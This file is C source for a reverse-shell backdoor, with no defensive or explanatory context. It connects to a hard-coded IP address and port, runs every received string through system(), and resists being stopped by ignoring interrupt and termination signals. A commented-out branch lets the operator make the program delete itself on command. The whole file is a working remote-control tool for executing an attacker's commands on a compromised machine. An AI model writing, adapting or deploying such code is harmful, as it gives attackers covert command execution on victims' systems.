#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>
#define PORT 2333 //default port, change it.
#define RECEIVE_LIMIT 1024
#define CLIENT_IP "192.168.29.30"
#define zero(_P) memset(&_P,0,sizeof(_P))
int handler(){
}
int main(int argc, char **argv){
	signal(SIGINT,handler);
	signal(SIGTERM,handler);
    int sockets, n=0;
    char receive_buffer[RECEIVE_LIMIT+1];
    struct sockaddr_in self; 
    memset(receive_buffer, '0' ,sizeof(receive_buffer));
    if((sockets = socket(AF_INET, SOCK_STREAM, 0))<0){
        puts("Error : Could not create socket.");
        return 1;
    }
    self.sin_family=AF_INET;
    self.sin_port=htons(PORT);
    self.sin_addr.s_addr=inet_addr(CLIENT_IP);
    while(1){
    if(connect(sockets, (struct sockaddr *)&self, sizeof(self))<0){
      printf("\n Error : Connect Failed \n");
      return 1;
    }
    while((n = read(sockets, receive_buffer, sizeof(receive_buffer)-1)) > 0){
		if(n<0){
      		printf("\n Read Error \n");
  		}
        receive_buffer[n]='\0';
        /*if(strcmp("SIGDESTRUCT",receive_buffer)==0){
			    remove(argv[0]);
			    return 0;
        }*/
		    system(receive_buffer);
        printf("\n");
    }
    }
  return 0;
}
